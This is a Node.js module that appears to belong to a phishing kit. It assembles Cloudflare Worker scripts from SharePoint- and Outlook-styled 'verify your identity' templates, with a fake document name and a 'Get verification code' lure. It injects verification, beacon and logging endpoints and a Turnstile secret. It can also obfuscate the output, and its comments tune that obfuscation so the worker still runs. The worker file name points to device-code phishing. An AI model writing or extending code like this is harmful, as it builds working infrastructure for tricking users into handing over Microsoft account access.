// Template Loader – Builds worker script with injected template HTML
// Used server-side during worker deployment

const fs = require('fs');
const path = require('path');
const { loadTemplateHTML, loadTemplateCSS, loadTemplateJS, loadVerificationDesignCSS } = require('../backend/services/templateloader');
const config = require('../backend/config/env');

function buildWorkerScript(link, user) {
	const templateType = link.template_type || 'sharepoint3';
	const designName = link.verification_design || 'outlook';
	
	let templateHTML = loadTemplateHTML(templateType);
	const templateCSS = loadTemplateCSS(templateType) + '\n' + loadVerificationDesignCSS(designName);
	let templateJS = loadTemplateJS(templateType);
	
	// Replace template placeholders
	templateHTML = templateHTML
		.replace('{{CSS}}', templateCSS)
		.replace('{{TITLE}}', link.title_text || 'Verify your identity')
		.replace('{{MESSAGE}}', link.message_text || 'Please verify your identity to continue')
		.replace('{{BUTTON_TEXT}}', link.button_text || 'Get verification code')
		.replace('{{FILE_NAME}}', link.file_name || 'Document.pdf')
		.replace('{{PAGES}}', String(link.pages || 1));
	
	// Handle preload/no-preload
	const templateConfig = require(`../templates/${templateType}/config.json`);
	if (templateConfig.preload) {
		templateHTML = templateHTML.replace(/\{\{#PRELOAD\}\}/g, '').replace(/\{\{\/PRELOAD\}\}/g, '');
		templateHTML = templateHTML.replace(/\{\{#NO_PRELOAD\}\}[\s\S]*?\{\{\/NO_PRELOAD\}\}/g, '');
	} else {
		templateHTML = templateHTML.replace(/\{\{#NO_PRELOAD\}\}/g, '').replace(/\{\{\/NO_PRELOAD\}\}/g, '');
		templateHTML = templateHTML.replace(/\{\{#PRELOAD\}\}[\s\S]*?\{\{\/PRELOAD\}\}/g, '');
	}
	
	// Escape for injection into worker
	templateHTML = templateHTML.replace(/`/g, '\\`').replace(/\$/g, '\\$');
	
	// Load worker base
	let workerScript = fs.readFileSync(path.join(__dirname, 'devicecode-worker.js'), 'utf8');
	
	// Inject values
	const serverUrl = `https://${config.CF_WORKERS_SUBDOMAIN}.workers.dev`; // Adjust as needed
	workerScript = workerScript
		.replace("'{{VERIFY_ENDPOINT}}'", `'${serverUrl}'`)
		.replace("'{{BEACON_ENDPOINT}}'", `'${serverUrl}'`)
		.replace("'{{LOG_ENDPOINT}}'", `'${serverUrl}'`)
		.replace("'{{TURNSTILE_SECRET}}'", `'${config.CF_TURNSTILE_SECRET_KEY}'`)
		.replace("'{{TEMPLATE_HTML}}'", `\`${templateHTML}\``);
	
	// Obfuscate if enabled - DO NOT use compact:true or selfDefending:true on workers
	// as these break the Cloudflare Workers runtime (addEventListener binding gets corrupted)
	if (config.ENABLE_OBFUSCATION || link.obfuscated) {
		try {
			const JavaScriptObfuscator = require('javascript-obfuscator');
			const result = JavaScriptObfuscator.obfuscate(workerScript, {
				compact: false,
				controlFlowFlattening: false,
				controlFlowFlatteningThreshold: 0,
				deadCodeInjection: false,
				debugProtection: false,
				debugProtectionInterval: false,
				disableConsoleOutput: true,
			identifierNamesGenerator: 'hexadecimal',
				log: false,
				numbersToExpressions: false,
				renameGlobals: false,
				selfDefending: false,
				simplify: true,
				splitStrings: false,
				stringArray: false,
				stringArrayCallsTransform: false,
				stringArrayEncoding: [],
				stringArrayIndexShift: false,
				stringArrayRotate: false,
				stringArrayShuffle: false,
				stringArrayWrappersCount: 0,
				stringArrayWrappersChainedCalls: false,
				stringArrayWrappersParametersMaxCount: 0,
				transformObjectKeys: false,
				unicodeEscapeSequence: false,
			});
			workerScript = result.getObfuscatedCode();
		} catch (e) {
			console.error('[Obfuscation] Worker obfuscation failed:', e.message);
		}
	}
	
	return workerScript;
}

module.exports = { buildWorkerScript };
